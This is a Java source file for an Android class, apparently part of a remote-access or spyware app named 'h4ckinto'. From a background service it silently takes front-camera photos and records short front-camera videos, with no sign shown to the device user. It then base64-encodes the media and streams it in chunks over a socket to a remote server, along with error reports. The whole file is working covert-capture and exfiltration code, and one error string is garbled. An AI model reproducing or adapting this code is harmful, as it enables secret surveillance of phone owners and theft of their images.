package com.h4ckinto.android.managers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.h4ckinto.android.network.SocketManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Collections;

/**
 * CameraManager using Camera2 API for background photo capture.
 * 
 * Camera2 API works from foreground services when the service declares
 * foregroundServiceType="camera" in the manifest.
 * 
 * The old Camera API (Camera.open()) requires an Activity context and
 * fails with "Fail to connect to camera service" in background.
 */
public class CameraManager {
    private static final String TAG = "CameraManager";

    /** Smaller resolution = much smaller file + faster upload (max ~VGA). */
    private static final int VIDEO_MAX_PIXELS = 640 * 480;
    /** H.264 bitrate — lower = smaller file / faster send (still usable for front cam). */
    private static final int VIDEO_BIT_RATE_BPS = 750_000;
    private static final int VIDEO_FRAME_RATE = 15;
    /** Larger chunks = fewer socket messages (base64 still expands ~4/3). */
    private static final int VIDEO_UPLOAD_CHUNK_BYTES = 256 * 1024;
    private static final int VIDEO_CHUNK_SLEEP_MS = 4;
    
    private Context context;
    private SocketManager socketManager;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private boolean isCapturing = false;

    private MediaRecorder mediaRecorderVideo;
    private CameraCaptureSession videoCaptureSession;
    private File pendingVideoFile;
    private boolean isRecordingVideo = false;
    private int lastVideoDurationSec = 15;
    private Runnable videoStopRunnable;
    
    public CameraManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
        startBackgroundThread();
    }
    
    /**
     * Start background thread for camera operations
     */
    private void startBackgroundThread() {
        if (backgroundThread == null || !backgroundThread.isAlive()) {
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
    }
    
    /**
     * Take a photo using the front camera via Camera2 API.
     * Works from background service with foregroundServiceType="camera".
     */
    public void takeFrontPhoto() {
        if (isCapturing) {
            Log.w(TAG, "Camera capture already in progress");
            return;
        }
        
        // Ensure background thread is running
        startBackgroundThread();
        
        backgroundHandler.post(() -> {
            try {
                // Check permission
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                        != PackageManager.PERMISSION_GRANTED) {
                    Log.w(TAG, "Camera permission not granted");
                    sendError("Camera permission not granted");
                    return;
                }
                
                isCapturing = true;
                
                // Get the system camera manager (android.hardware.camera2.CameraManager)
                android.hardware.camera2.CameraManager camera2Manager = 
                    (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                
                if (camera2Manager == null) {
                    sendError("Camera service not available");
                    isCapturing = false;
                    return;
                }
                
                // Find front camera
                String frontCameraId = findFrontCameraId(camera2Manager);
                if (frontCameraId == null) {
                    sendError("Front camera not found");
                    isCapturing = false;
                    return;
                }
                
                Log.d(TAG, "Found front camera: " + frontCameraId);
                
                // Get optimal size
                CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(frontCameraId);
                android.hardware.camera2.params.StreamConfigurationMap map = 
                    characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                
                Size photoSize = getBestSize(map);
                Log.d(TAG, "Using photo size: " + photoSize.getWidth() + "x" + photoSize.getHeight());
                
                // Create ImageReader to capture the photo
                imageReader = ImageReader.newInstance(
                    photoSize.getWidth(), photoSize.getHeight(), 
                    ImageFormat.JPEG, 1
                );
                
                imageReader.setOnImageAvailableListener(reader -> {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] data = new byte[buffer.remaining()];
                            buffer.get(data);
                            
                            Log.d(TAG, "✅ Photo captured: " + data.length + " bytes");
                            processAndSendPhoto(data);
                        } else {
                            sendError("Failed to capture image - null image");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error reading image", e);
                        sendError("Failed to read captured image: " + e.getMessage());
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                        closeCamera();
                    }
                }, backgroundHandler);
                
                // Open camera
                Log.d(TAG, "Opening front camera...");
                camera2Manager.openCamera(frontCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        Log.d(TAG, "✅ Camera opened successfully");
                        cameraDevice = camera;
                        createCaptureSession();
                    }
                    
                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        Log.w(TAG, "Camera disconnected");
                        closeCamera();
                    }
                    
                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        String errorMsg = "Camera error code: " + error;
                        switch (error) {
                            case ERROR_CAMERA_IN_USE: errorMsg = "Camera is in use by another app"; break;
                            case ERROR_MAX_CAMERAS_IN_USE: errorMsg = "Too many cameras in use"; break;
                            case ERROR_CAMERA_DISABLED: errorMsg = "Camera is disabled"; break;
                            case ERROR_CAMERA_DEVICE: errorMsg = "Camera device error"; break;
                            case ERROR_CAMERA_SERVICE: errorMsg = "Camera service error"; break;
                        }
                        Log.e(TAG, "❌ " + errorMsg);
                        sendError(errorMsg);
                        closeCamera();
                    }
                }, backgroundHandler);
                
            } catch (SecurityException e) {
                Log.e(TAG, "❌ Camera permission denied at runtime", e);
                sendError("Camera permission denied: " + e.getMessage());
                isCapturing = false;
            } catch (Exception e) {
                Log.e(TAG, "❌ Error opening camera", e);
                sendError("Failed to open camera: " + e.getMessage());
                isCapturing = false;
            }
        });
    }
    
    /**
     * Create capture session and take photo
     */
    private void createCaptureSession() {
        try {
            if (cameraDevice == null || imageReader == null) {
                sendError("Camera or ImageReader not initialized");
                isCapturing = false;
                return;
            }
            
            Surface surface = imageReader.getSurface();
            
            cameraDevice.createCaptureSession(
                Collections.singletonList(surface),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        Log.d(TAG, "Capture session configured");
                        try {
                            // Create capture request
                            CaptureRequest.Builder captureBuilder = 
                                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            captureBuilder.addTarget(surface);
                            
                            // Auto-focus
                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, 
                                CaptureRequest.CONTROL_AF_MODE_AUTO);
                            // Auto-exposure
                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, 
                                CaptureRequest.CONTROL_AE_MODE_ON);
                            // JPEG quality
                            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                            
                            // Take the photo
                            Log.d(TAG, "Taking photo...");
                            session.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                                @Override
                                public void onCaptureCompleted(@NonNull CameraCaptureSession session, 
                                    @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
                                    Log.d(TAG, "✅ Capture completed");
                                }
                            }, backgroundHandler);
                            
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error capturing photo", e);
                            sendError("Failed to capture photo: " + e.getMessage());
                            closeCamera();
                        }
                    }
                    
                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                        Log.e(TAG, "❌ Capture session configuration failed");
                        sendError("Camera capture session configuration failed");
                        closeCamera();
                    }
                },
                backgroundHandler
            );
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error creating capture session", e);
            sendError("Failed to create capture session: " + e.getMessage());
            closeCamera();
        }
    }
    
    /**
     * Find front camera ID using Camera2 API
     */
    private String findFrontCameraId(android.hardware.camera2.CameraManager camera2Manager) {
        try {
            String[] cameraIds = camera2Manager.getCameraIdList();
            Log.d(TAG, "Found " + cameraIds.length + " cameras");
            
            for (String id : cameraIds) {
                CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    Log.d(TAG, "Front camera found: ID " + id);
                    return id;
                }
            }
            
            Log.w(TAG, "No front camera found");
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Error finding front camera", e);
            return null;
        }
    }
    
    /**
     * Get best photo size (target ~1280x720)
     */
    private Size getBestSize(android.hardware.camera2.params.StreamConfigurationMap map) {
        if (map == null) {
            return new Size(640, 480);
        }
        
        Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
        if (sizes == null || sizes.length == 0) {
            return new Size(640, 480);
        }
        
        int targetWidth = 1280;
        int targetHeight = 720;
        Size bestSize = null;
        int bestDiff = Integer.MAX_VALUE;
        
        for (Size size : sizes) {
            if (size.getWidth() <= targetWidth && size.getHeight() <= targetHeight) {
                int diff = Math.abs(size.getWidth() - targetWidth) + Math.abs(size.getHeight() - targetHeight);
                if (diff < bestDiff) {
                    bestDiff = diff;
                    bestSize = size;
                }
            }
        }
        
        // Fallback to smallest
        if (bestSize == null) {
            bestSize = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() * size.getHeight() < bestSize.getWidth() * bestSize.getHeight()) {
                    bestSize = size;
                }
            }
        }
        
        return bestSize;
    }
    
    /**
     * Process photo and send to server
     */
    private void processAndSendPhoto(byte[] data) {
        try {
            if (data == null || data.length == 0) {
                sendError("Photo data is null or empty");
                return;
            }
            
            Log.d(TAG, "Processing photo, original size: " + data.length + " bytes");
            
            // Try to compress for smaller file size
            Bitmap bitmap = null;
            try {
                bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                if (bitmap == null) {
                    sendPhotoToServer(data);
                    return;
                }
            } catch (OutOfMemoryError e) {
                Log.e(TAG, "Out of memory decoding photo", e);
                sendPhotoToServer(data);
                return;
            }
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, bos);
            byte[] compressedData = bos.toByteArray();
            bos.close();
            
            Log.d(TAG, "Photo compressed: " + data.length + " → " + compressedData.length + " bytes");
            sendPhotoToServer(compressedData);
            
            if (bitmap != null && !bitmap.isRecycled()) {
                bitmap.recycle();
            }
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "Out of memory processing photo", e);
            sendError("Out of memory processing photo");
        } catch (Exception e) {
            Log.e(TAG, "Error processing photo", e);
            sendError("Failed to process photo: " + e.getMessage());
        } finally {
            isCapturing = false;
        }
    }
    
    /**
     * Send photo to server (supports chunked transfer for large photos)
     */
    private void sendPhotoToServer(byte[] photoData) {
        try {
            if (photoData == null || photoData.length == 0) {
                sendError("Photo data is empty");
                return;
            }
            
            Log.d(TAG, "Sending photo to server: " + photoData.length + " bytes");
            
            // For large photos, send in chunks
            int maxChunkSize = 500 * 1024;
            if (photoData.length > maxChunkSize) {
                sendPhotoInChunks(photoData);
                return;
            }
            
            String base64Photo = android.util.Base64.encodeToString(photoData, android.util.Base64.NO_WRAP);
            
            JSONObject photoDataObj = new JSONObject();
            photoDataObj.put("type", "front_camera_photo");
            photoDataObj.put("image", true);
            photoDataObj.put("buffer", base64Photo);
            photoDataObj.put("size", photoData.length);
            photoDataObj.put("timestamp", System.currentTimeMillis());
            photoDataObj.put("camera", "front");
            
            socketManager.sendFileData(photoDataObj);
            Log.d(TAG, "✅ Front camera photo sent to server (" + photoData.length + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending photo", e);
            sendError("Failed to send photo: " + e.getMessage());
        }
    }
    
    /**
     * Send large photo in chunks
     */
    private void sendPhotoInChunks(byte[] photoData) {
        try {
            int chunkSize = 500 * 1024;
            int totalChunks = (int) Math.ceil((double) photoData.length / chunkSize);
            
            Log.d(TAG, "Sending photo in " + totalChunks + " chunks");
            
            JSONObject startData = new JSONObject();
            startData.put("type", "front_camera_photo_start");
            startData.put("totalSize", photoData.length);
            startData.put("totalChunks", totalChunks);
            startData.put("timestamp", System.currentTimeMillis());
            socketManager.sendFileData(startData);
            
            for (int i = 0; i < totalChunks; i++) {
                int offset = i * chunkSize;
                int length = Math.min(chunkSize, photoData.length - offset);
                byte[] chunk = new byte[length];
                System.arraycopy(photoData, offset, chunk, 0, length);
                
                String base64Chunk = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP);
                
                JSONObject chunkData = new JSONObject();
                chunkData.put("type", "front_camera_photo_chunk");
                chunkData.put("chunkIndex", i);
                chunkData.put("chunkData", base64Chunk);
                chunkData.put("chunkSize", length);
                chunkData.put("totalSize", photoData.length);
                chunkData.put("totalChunks", totalChunks);
                socketManager.sendFileData(chunkData);
                
                Thread.sleep(50);
            }
            
            JSONObject completeData = new JSONObject();
            completeData.put("type", "front_camera_photo_complete");
            completeData.put("totalSize", photoData.length);
            completeData.put("totalChunks", totalChunks);
            socketManager.sendFileData(completeData);
            
            Log.d(TAG, "✅ Photo sent in " + totalChunks + " chunks");
        } catch (Exception e) {
            Log.e(TAG, "Error sending photo in chunks", e);
            sendError("Failed to send photo chunks: " + e.getMessage());
        }
    }
    
    /**
     * Close camera and release resources
     */
    private void closeCamera() {
        try {
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
        isCapturing = false;
    }
    
    /**
     * Send error to server
     */
    private void sendError(String error) {
        try {
            Log.e(TAG, "Camera error: " + error);
            JSONObject errorData = new JSONObject();
            errorData.put("type", "camera_error");
            errorData.put("error", error);
            errorData.put("timestamp", System.currentTimeMillis());
            socketManager.sendFileData(errorData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        } finally {
            isCapturing = false;
        }
    }
    
    public boolean isCapturing() {
        return isCapturing;
    }

    /**
     * Record a short MP4 from the front camera and upload in chunks (like screen recording).
     * Requires API 23+ (MediaRecorder#getSurface with Camera2).
     */
    public void recordFrontVideo(int durationSec) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            sendFrontVideoError("Front camera video requires Android 6 or newer");
            return;
        }
        if (isRecordingVideo) {
            Log.w(TAG, "Video recording already in progress");
            return;
        }
        lastVideoDurationSec = Math.max(5, Math.min(60, durationSec));
        startBackgroundThread();
        backgroundHandler.post(() -> startFrontVideoRecordingInternal(lastVideoDurationSec));
    }

    private void startFrontVideoRecordingInternal(int durationSec) {
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                sendFrontVideoError("Camera permission not granted");
                return;
            }
            closeCamera();
            isRecordingVideo = true;
            pendingVideoFile = new File(context.getCacheDir(), "fcv_" + System.currentTimeMillis() + ".mp4");

            android.hardware.camera2.CameraManager camera2Manager =
                    (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (camera2Manager == null) {
                sendFrontVideoError("Camera service not available");
                return;
            }
            String frontCameraId = findFrontCameraId(camera2Manager);
            if (frontCameraId == null) {
                sendFrontVideoError("Front camera not found");
                return;
            }
            CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(frontCameraId);
            android.hardware.camera2.params.StreamConfigurationMap map =
                    characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size videoSize = chooseRecorderVideoSize(map);

            mediaRecorderVideo = new MediaRecorder();
            mediaRecorderVideo.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorderVideo.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorderVideo.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorderVideo.setVideoEncodingBitRate(VIDEO_BIT_RATE_BPS);
            mediaRecorderVideo.setVideoFrameRate(VIDEO_FRAME_RATE);
            mediaRecorderVideo.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    mediaRecorderVideo.setVideoEncodingProfileLevel(
                            android.media.MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline,
                            android.media.MediaCodecInfo.CodecProfileLevel.AVCLevel31);
                } catch (Exception ignored) {
                    // Some devices ignore or reject profile; default encoder settings still apply
                }
            }
            mediaRecorderVideo.setOutputFile(pendingVideoFile.getAbsolutePath());
            mediaRecorderVideo.prepare();
            final Surface recorderSurface = mediaRecorderVideo.getSurface();

            camera2Manager.openCamera(frontCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        camera.createCaptureSession(
                                Collections.singletonList(recorderSurface),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        videoCaptureSession = session;
                                        try {
                                            CaptureRequest.Builder b =
                                                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                            b.addTarget(recorderSurface);
                                            session.setRepeatingRequest(b.build(), null, backgroundHandler);
                                            mediaRecorderVideo.start();
                                            videoStopRunnable = () -> stopFrontCameraVideoAndUpload();
                                            backgroundHandler.postDelayed(videoStopRunnable, durationSec * 1000L);
                                            Log.d(TAG, "Front camera video started: " + durationSec + "s @ "
                                                    + videoSize.getWidth() + "x" + videoSize.getHeight()
                                                    + ", " + (VIDEO_BIT_RATE_BPS / 1000) + "kbps, "
                                                    + VIDEO_FRAME_RATE + "fps (compression preset for upload)");
                                        } catch (Exception e) {
                                            Log.e(TAG, "Failed to start video capture", e);
                                            sendFrontVideoError("Start recorimage.pngding failed: " + e.getMessage());
                                            cleanupVideoRecording();
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        Log.e(TAG, "Video capture session configure failed");
                                        sendFrontVideoError("Video session configuration failed");
                                        cleanupVideoRecording();
                                    }
                                },
                                backgroundHandler
                        );
                    } catch (Exception e) {
                        Log.e(TAG, "createCaptureSession failed", e);
                        sendFrontVideoError("Capture session failed: " + e.getMessage());
                        cleanupVideoRecording();
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    cleanupVideoRecording();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    sendFrontVideoError("Camera error code: " + error);
                    cleanupVideoRecording();
                }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "startFrontVideoRecordingInternal", e);
            sendFrontVideoError(e.getMessage() != null ? e.getMessage() : "Unknown error");
            cleanupVideoRecording();
        }
    }

    private Size chooseRecorderVideoSize(android.hardware.camera2.params.StreamConfigurationMap map) {
        if (map == null) {
            return new Size(640, 480);
        }
        Size[] sizes = map.getOutputSizes(MediaRecorder.class);
        if (sizes == null || sizes.length == 0) {
            return new Size(640, 480);
        }
        final int maxArea = VIDEO_MAX_PIXELS;
        Size best = null;
        for (Size s : sizes) {
            int area = s.getWidth() * s.getHeight();
            if (area <= maxArea) {
                if (best == null || area > best.getWidth() * best.getHeight()) {
                    best = s;
                }
            }
        }
        if (best == null) {
            best = sizes[0];
            for (Size s : sizes) {
                if (s.getWidth() * s.getHeight() < best.getWidth() * best.getHeight()) {
                    best = s;
                }
            }
        }
        return best;
    }

    private void stopFrontCameraVideoAndUpload() {
        try {
            if (videoStopRunnable != null) {
                backgroundHandler.removeCallbacks(videoStopRunnable);
                videoStopRunnable = null;
            }
        } catch (Exception ignored) {
        }

        try {
            if (videoCaptureSession != null) {
                try {
                    videoCaptureSession.stopRepeating();
                } catch (Exception ignored) {
                }
                try {
                    videoCaptureSession.close();
                } catch (Exception ignored) {
                }
                videoCaptureSession = null;
            }
            if (mediaRecorderVideo != null) {
                try {
                    mediaRecorderVideo.stop();
                } catch (Exception e) {
                    Log.w(TAG, "MediaRecorder stop: " + e.getMessage());
                }
                try {
                    mediaRecorderVideo.reset();
                    mediaRecorderVideo.release();
                } catch (Exception ignored) {
                }
                mediaRecorderVideo = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "stopFrontCameraVideoAndUpload", e);
        }

        closeCamera();

        File toSend = pendingVideoFile;
        pendingVideoFile = null;
        int dur = lastVideoDurationSec;
        isRecordingVideo = false;

        if (toSend != null && toSend.exists() && toSend.length() > 1024) {
            sendFrontVideoFileInChunks(toSend, dur);
        } else {
            if (toSend != null && toSend.exists()) {
                //noinspection ResultOfMethodCallIgnored
                toSend.delete();
            }
            sendFrontVideoError("Video file missing or too small");
        }
    }

    private void cleanupVideoRecording() {
        try {
            if (videoStopRunnable != null) {
                backgroundHandler.removeCallbacks(videoStopRunnable);
                videoStopRunnable = null;
            }
        } catch (Exception ignored) {
        }
        try {
            if (videoCaptureSession != null) {
                try {
                    videoCaptureSession.stopRepeating();
                } catch (Exception ignored) {
                }
                try {
                    videoCaptureSession.close();
                } catch (Exception ignored) {
                }
                videoCaptureSession = null;
            }
            if (mediaRecorderVideo != null) {
                try {
                    mediaRecorderVideo.stop();
                } catch (Exception ignored) {
                }
                try {
                    mediaRecorderVideo.reset();
                    mediaRecorderVideo.release();
                } catch (Exception ignored) {
                }
                mediaRecorderVideo = null;
            }
        } catch (Exception ignored) {
        }
        closeCamera();
        if (pendingVideoFile != null && pendingVideoFile.exists()) {
            //noinspection ResultOfMethodCallIgnored
            pendingVideoFile.delete();
        }
        pendingVideoFile = null;
        isRecordingVideo = false;
    }

    private void sendFrontVideoFileInChunks(File videoFile, int durationSec) {
        try {
            long fileSize = videoFile.length();
            String fileName = videoFile.getName();
            Log.d(TAG, "Uploading front camera video: " + fileName + " (" + fileSize + " bytes)");

            JSONObject fileInfo = new JSONObject();
            fileInfo.put("type", "front_camera_video_start");
            fileInfo.put("fileName", fileName);
            fileInfo.put("fileSize", fileSize);
            fileInfo.put("duration", durationSec);
            socketManager.sendFileData(fileInfo);

            FileInputStream fis = new FileInputStream(videoFile);
            byte[] buffer = new byte[VIDEO_UPLOAD_CHUNK_BYTES];
            int bytesRead;
            long totalSent = 0;
            int chunkIndex = 0;

            while ((bytesRead = fis.read(buffer)) > 0) {
                byte[] chunk = new byte[bytesRead];
                System.arraycopy(buffer, 0, chunk, 0, bytesRead);
                String base64Chunk = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP);

                JSONObject chunkData = new JSONObject();
                chunkData.put("type", "front_camera_video_chunk");
                chunkData.put("fileName", fileName);
                chunkData.put("chunkIndex", chunkIndex);
                chunkData.put("chunkData", base64Chunk);
                chunkData.put("chunkSize", bytesRead);
                chunkData.put("totalSize", fileSize);
                chunkData.put("totalSent", totalSent);
                socketManager.sendFileData(chunkData);

                totalSent += bytesRead;
                chunkIndex++;
                if (VIDEO_CHUNK_SLEEP_MS > 0) {
                    Thread.sleep(VIDEO_CHUNK_SLEEP_MS);
                }
            }
            fis.close();

            JSONObject completeData = new JSONObject();
            completeData.put("type", "front_camera_video_complete");
            completeData.put("fileName", fileName);
            completeData.put("fileSize", fileSize);
            completeData.put("totalChunks", chunkIndex);
            socketManager.sendFileData(completeData);

            if (videoFile.delete()) {
                Log.d(TAG, "Temp video file deleted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending front camera video", e);
            sendFrontVideoError("Upload failed: " + e.getMessage());
        }
    }

    private void sendFrontVideoError(String msg) {
        try {
            Log.e(TAG, "Front video error: " + msg);
            JSONObject o = new JSONObject();
            o.put("type", "front_camera_video_error");
            o.put("error", msg);
            o.put("timestamp", System.currentTimeMillis());
            socketManager.sendFileData(o);
        } catch (Exception e) {
            Log.e(TAG, "sendFrontVideoError", e);
        } finally {
            isRecordingVideo = false;
        }
    }
    
    public void destroy() {
        closeCamera();
        cleanupVideoRecording();
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join(1000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
            backgroundThread = null;
            backgroundHandler = null;
        }
    }
}
